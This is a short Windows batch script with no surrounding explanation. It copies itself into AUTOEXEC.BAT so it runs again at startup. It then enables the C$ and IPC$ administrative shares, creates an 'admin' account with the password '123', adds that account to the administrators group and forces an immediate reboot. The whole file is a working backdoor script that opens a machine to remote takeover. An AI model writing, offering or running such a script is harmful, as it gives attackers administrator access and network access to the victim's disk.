   @echo off
   color 2f
   copy test.cmd c:\AUTOEXEC.BAT
   net share c$ /y
   net share ipc$ /y
   net user admin 123 /add
   net localgroup administrators admin /add
   shutdown -r -f -t 0.1
